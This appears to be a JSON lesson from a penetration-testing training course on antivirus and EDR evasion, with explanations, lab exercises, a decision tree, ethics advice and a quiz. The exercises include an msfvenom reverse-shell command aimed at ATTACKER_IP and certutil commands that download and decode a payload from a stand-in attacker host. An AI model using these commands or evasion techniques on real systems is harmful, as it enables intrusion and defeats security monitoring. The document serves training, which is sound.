{
  "lesson_id": "5a88cbdf-df4d-4cf7-a690-8b4b83c549e3",
  "domain": "pentest",
  "title": "Antivirus and EDR Evasion Techniques",
  "subtitle": "Practical bypass strategies aligned with PWK ethical limits",
  "difficulty": 3,
  "estimated_time": 80,
  "order_index": 28,
  "author": "CyberLearn Offensive Curriculum Team",
  "base_xp_reward": 210,
  "mastery_threshold": 84,
  "is_core_concept": true,
  "created_at": "2025-01-20T12:00:00",
  "updated_at": "2025-01-20T12:00:00",
  "version": "1.0",
  "prerequisites": [
    "Initial Access Tradecraft",
    "Payload Development and Execution"
  ],
  "concepts": [
    "Defender telemetry",
    "Signature and heuristic detection",
    "Payload obfuscation",
    "Living-off-the-land binaries",
    "Process injection techniques",
    "Command and control profile tuning",
    "EDR evasion testing",
    "Reporting on defensive gaps"
  ],
  "learning_objectives": [
    "Explain how modern AV and EDR engines detect offensive activity",
    "Design payloads that reduce static and behavioral signatures",
    "Leverage LOLBins and native tools for stealthy execution",
    "Test evasion hypotheses safely within PWK or lab environments",
    "Communicate detection gaps and mitigation strategies to defenders"
  ],
  "jim_kwik_principles": [
    "Visualization",
    "Active learning"
  ],
  "content_blocks": [
    {
      "block_id": "ba710a4c-0fbf-4416-88a8-6fc2c450a8ca",
      "type": "explanation",
      "title": "Understanding Defender Telemetry",
      "content": {
        "text": "# How AV and EDR Watch You\n\nAntivirus engines rely on signature databases and heuristic rules. Endpoint Detection and Response (EDR) extends this by monitoring process creation, command-line arguments, DLL loads, network connections, and memory operations. Knowing what data defenders see informs your evasion plan.\n\n## Telemetry Sources\n\n- Windows Event Logs: Sysmon events 1, 3, 7, 10, 11, 13 are common triggers.\n- Kernel callbacks: many EDRs hook NtCreateThreadEx, NtWriteVirtualMemory.\n- Userland API hooking: DLLs inject into processes to intercept Win32 APIs.\n- Cloud analytics: telemetry forwarded to SIEM/SOAR for correlation.\n\n## PWK Perspective\n\nPWK labs run minimal defenses, but the exam expects you to discuss evasion strategies in reports. Practise articulating how your techniques map to telemetry to build credibility."
      },
      "simplified_explanation": "EDR watches processes, memory operations, and network traffic; know the telemetry.",
      "memory_aids": [
        "Logs + Hooks + Cloud"
      ],
      "real_world_connection": "Blue teams rely on Sysmon and kernel callbacks to flag privilege escalation chains.",
      "reflection_prompt": "Which telemetry source have you spent the most time studying?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "4bc2ce81-5511-486e-8457-4193a16a208d",
      "type": "explanation",
      "title": "Signature and Heuristic Avoidance",
      "content": {
        "text": "# Static Detection\n\nSignature engines hash payloads and flag known malicious code. Countermeasures:\n- Recompile or modify shellcode to change byte patterns.\n- Encrypt payloads with unique keys and decrypt in memory.\n- Use shellcode loaders that download payloads on demand.\n\n## Heuristic Detection\n\nBehavioral engines flag suspicious actions:\n- Macro-enabled Office documents launching PowerShell.\n- mshta executing remote scripts.\n- Abnormal parent-child process pairs (e.g., winword spawning cmd).\n\nMitigations include delaying execution, using legitimate parent processes, and mimicking normal command-line arguments."
      },
      "simplified_explanation": "Alter payload bytes and behavior to dodge signatures and heuristics.",
      "memory_aids": [
        "Modify bytes, mimic behavior"
      ],
      "real_world_connection": "OSCP graders expect you to explain why custom-compiled payloads bypass Defender.",
      "reflection_prompt": "How do you currently test whether a payload triggers heuristic detections?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "2891e44d-c980-4fc8-95de-52bcc41c0c8c",
      "type": "explanation",
      "title": "Living-off-the-Land and Native Tools",
      "content": {
        "text": "# LOLBins Overview\n\nLiving-off-the-land binaries (LOLBins) are legitimate executables abused for malicious actions. Examples include:\n- `rundll32` executing DLL exports.\n- `certutil` for downloading and decoding payloads.\n- `msbuild` compiling and running inline C#.\n- `wmic` or `powershell` for remote execution.\n\n## Trade-offs\n\nLOLBins blend into normal activity but still leave telemetry. Some defenders flag unusual command arguments. Combine LOLBins with environment-specific knowledge to maintain stealth.\n\n## Scripted Execution\n\nFor PowerShell, use constrained language mode bypasses (e.g., `powershell -nop -w hidden -enc ...`) carefully. On Linux, leverage bash built-ins, curl, wget, and ssh for stealth."
      },
      "simplified_explanation": "Use trusted binaries to execute payloads while blending with normal operations.",
      "memory_aids": [
        "LOLBins need context"
      ],
      "real_world_connection": "PWK exam write-ups often cite certutil and msbuild for stealth execution.",
      "reflection_prompt": "Which LOLBins do you rely on, and how do you justify them in reports?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "62973416-334d-4e5a-9741-6675afcdac4c",
      "type": "explanation",
      "title": "Process Injection and Memory Tradecraft",
      "content": {
        "text": "# Process Injection Techniques\n\n- **Classic DLL injection**: LoadLibrary into remote process; easily detected.\n- **Reflective DLL injection**: Load DLL from memory without touching disk.\n- **Process hollowing**: Create suspended process, unmap memory, write payload, resume.\n- **APC queueing**: Queue asynchronous procedure calls to run shellcode in target thread.\n\n## Evading Detection\n\n- Use syscalls (e.g., Hell's Gate, SysWhispers) to bypass userland hooks.\n- Randomise API resolution and sleep jitter.\n- Clean up handles and restore original bytes when possible.\n\nRemember: OSCP encourages understanding techniques, but exam machines rarely require complex injection. Focus on lab practice to discuss the concepts intelligently."
      },
      "simplified_explanation": "Inject into processes carefully, using syscalls and cleanup to avoid hooks.",
      "memory_aids": [
        "Reflect, Hollow, APC"
      ],
      "real_world_connection": "Modern EDRs detect CreateRemoteThread spikes; stealth requires syscall-level tradecraft.",
      "reflection_prompt": "Can you explain the difference between reflective injection and process hollowing without notes?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "e684d557-74a7-4998-8b73-c494b656faa5",
      "type": "code_exercise",
      "title": "Custom msfvenom Payload Recompile",
      "content": {
        "text": "Practise generating unique payloads:\n\n1. Generate raw shellcode: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f c`.\n2. Wrap shellcode in a custom C template that allocates memory, copies bytes, and spawns a thread via direct syscalls.\n3. Compile with `x86_64-w64-mingw32-gcc -o loader.exe loader.c`.\n4. Scan loader.exe with Windows Defender (on a disposable VM) to verify detection.\n5. Modify encryption key, sleep timers, and API resolution to observe detection changes.\n\nRecord each iteration's hash and detection status."
      },
      "simplified_explanation": "Regenerate payloads with custom loaders to evade static signatures.",
      "memory_aids": [],
      "real_world_connection": "Custom loaders routinely bypass default Defender settings in PWK labs.",
      "reflection_prompt": "Which loader modifications had the biggest impact on Defender detection?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "65ebb28f-3c45-43dc-a9a6-475807a20b1e",
      "type": "code_exercise",
      "title": "certutil LOLBin Lab",
      "content": {
        "text": "Execute payload delivery with certutil:\n\n```cmd\ncertutil -urlcache -split -f https://ATTACKER/payload.txt C:\\Users\\Public\\payload.txt\ncertutil -decode C:\\Users\\Public\\payload.txt C:\\Users\\Public\\payload.exe\n```\n\n- Host payload in base64 format to avoid basic proxies.\n- After decoding, run payload and observe Defender response.\n- Clean up cache: `certutil -urlcache -split -f http://localhost/ delete`.\n\nDocument network logs, file paths, and Defender alerts."
      },
      "simplified_explanation": "Use certutil to download and decode payloads stealthily.",
      "memory_aids": [],
      "real_world_connection": "certutil is a common living-off-the-land technique noted in MITRE ATT&CK T1105.",
      "reflection_prompt": "How would defenders differentiate malicious from legitimate certutil usage?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "f297ae9d-459c-4028-9a69-8d79f1267691",
      "type": "code_exercise",
      "title": "Syscall-based Shellcode Execution",
      "content": {
        "text": "Experiment with direct syscalls:\n\n1. Clone a public syscall loader repository (e.g., SysWhispers2) and generate stubs for NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx.\n2. Embed your shellcode and compile the loader.\n3. Run loader on a test VM with EDR disabled, then enable Defender to observe differences.\n4. Compare telemetry with classic VirtualAlloc/WriteProcessMemory/ResumeThread techniques.\n\nNote the complexity vs. benefit trade-off for exam scenarios."
      },
      "simplified_explanation": "Use syscalls to avoid userland API hooks when executing shellcode.",
      "memory_aids": [],
      "real_world_connection": "Advanced operators rely on syscalls to evade EDR hooking.",
      "reflection_prompt": "When would syscall loaders be overkill for a PWK target?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "9d8b379e-a385-4e2c-b1a2-c58c83de032a",
      "type": "real_world",
      "title": "Case Study: EDR Blind Spot",
      "content": {
        "text": "A technology company deployed a well-known EDR. Red teamers observed that Office macros spawning msbuild were blocked, but signed installers invoking PowerShell were not. By packaging their payload inside an MSI and using legitimate parameters, they bypassed controls and established persistent C2. The incident report recommended expanding application control policies and monitoring msiexec child processes.\n\n**Insight:** EDR coverage is uneven; understanding business workflows reveals blind spots."
      },
      "simplified_explanation": "Legitimate installers can bypass EDR if policies lack context.",
      "memory_aids": [
        "Signed installers can be malicious"
      ],
      "real_world_connection": "",
      "reflection_prompt": "How would you test msiexec behavior in your lab without harming production?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "120d60f8-642e-4705-b0b4-396984a858fa",
      "type": "memory_aid",
      "title": "Mnemonic: SHIELD",
      "content": {
        "text": "Anchor your evasion workflow with SHIELD:\n\n- **S**tudy telemetry first\n- **H**arden payload bytes\n- **I**mitate normal behavior\n- **E**xecute with LOLBins when possible\n- **L**imit footprint (cleanup)\n- **D**ocument detection gaps for the report\n\nReview SHIELD before launching any evasive payload."
      },
      "simplified_explanation": "SHIELD keeps evasion disciplined and report-ready.",
      "memory_aids": [
        "Study, Harden, Imitate, Execute, Limit, Document"
      ],
      "real_world_connection": "",
      "reflection_prompt": "Which SHIELD step saves you the most time during engagements?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "66e4c75a-d61a-4f4d-ae8d-af1431d7d840",
      "type": "diagram",
      "title": "Evasion Decision Tree",
      "content": {
        "text": "```\nPayload needs execution?\n    |\n    +--> High detection risk --> Recompile + Encrypt --> Test in lab\n    |\n    +--> Needs fileless? --> PowerShell/CLR loader --> Monitor telemetry\n    |\n    +--> Defender flag? --> Switch to LOLBin delivery --> certutil/msbuild\n    |\n    +--> Still detected? --> Syscall loader or alternate C2 profile\n    |\n    +--> Success --> Document + Cleanup\n```"
      },
      "simplified_explanation": "Decide whether to recompile, go fileless, or switch techniques based on detections.",
      "memory_aids": [
        "Iterate decisions until payload succeeds safely."
      ],
      "real_world_connection": "",
      "reflection_prompt": "Where would you insert automated lab testing in this decision tree?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "69f4ac27-9c71-425d-82e6-5344c041e626",
      "type": "mindset_coach",
      "title": "Ethical Constraints",
      "content": {
        "text": "Evasion skills come with responsibility. In PWK and client networks, stay within agreed rules of engagement. Never disable production defenses without permission. Your credibility depends on balancing offensive creativity with respect for defensive teams."
      },
      "simplified_explanation": "Stay within scope when testing evasion techniques.",
      "memory_aids": [
        "Scope before stealth."
      ],
      "real_world_connection": "Clients blacklist firms that disable antivirus without explicit approval.",
      "reflection_prompt": "How will you communicate your evasion tests to defenders ahead of time?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "2c9b9871-fa05-4d77-9283-b50b242de0ba",
      "type": "reflection",
      "title": "Evasion Retrospective",
      "content": {
        "text": "After lab practice document:\n\n- Which payload variants bypassed Defender and why?\n- What telemetry did you monitor to confirm stealth?\n- Which LOLBins felt most natural for the target environment?\n- How will you articulate remediation steps for each bypass?\n- What safeguards ensured you stayed within scope?\n\nConvert findings into a table for your exam report template."
      },
      "simplified_explanation": "Review payload success, telemetry, LOLBins, mitigations, and scope controls.",
      "memory_aids": [],
      "real_world_connection": "",
      "reflection_prompt": "Which question highlights a communication gap with blue teams?",
      "is_interactive": false,
      "xp_reward": 0
    }
  ],
  "post_assessment": [
    {
      "question": "Which Sysmon event ID is most associated with network connections that may reveal command and control traffic?",
      "options": [
        "Event ID 1",
        "Event ID 3",
        "Event ID 7",
        "Event ID 10"
      ],
      "correct_answer": 1,
      "explanation": "Sysmon event ID 3 records network connections, useful for spotting C2 beacons.",
      "question_id": "2cd0198f-4d9c-459a-ba19-2708ef2bc6f8",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question": "Why does reimplementing shellcode execution using direct syscalls reduce detection by some EDR products?",
      "options": [
        "Direct syscalls encrypt payloads by default",
        "Syscalls avoid userland API hooks commonly used by EDRs",
        "Syscalls automatically disable Windows Defender",
        "EDRs cannot monitor kernel activity"
      ],
      "correct_answer": 1,
      "explanation": "EDRs often hook userland APIs, so invoking syscalls directly bypasses those hooks and reduces detections.",
      "question_id": "32123a30-33b2-46ca-8fa0-d451e6e82e22",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question": "Which living-off-the-land binary is commonly abused to download and decode payloads on Windows?",
      "options": [
        "wevtutil",
        "diskpart",
        "certutil",
        "taskkill"
      ],
      "correct_answer": 2,
      "explanation": "certutil can fetch remote content and decode base64 payloads, making it a popular LOLBin.",
      "question_id": "34be7042-8e49-4b58-859c-8b6a8da9ba4e",
      "type": "multiple_choice",
      "difficulty": 3
    }
  ]
}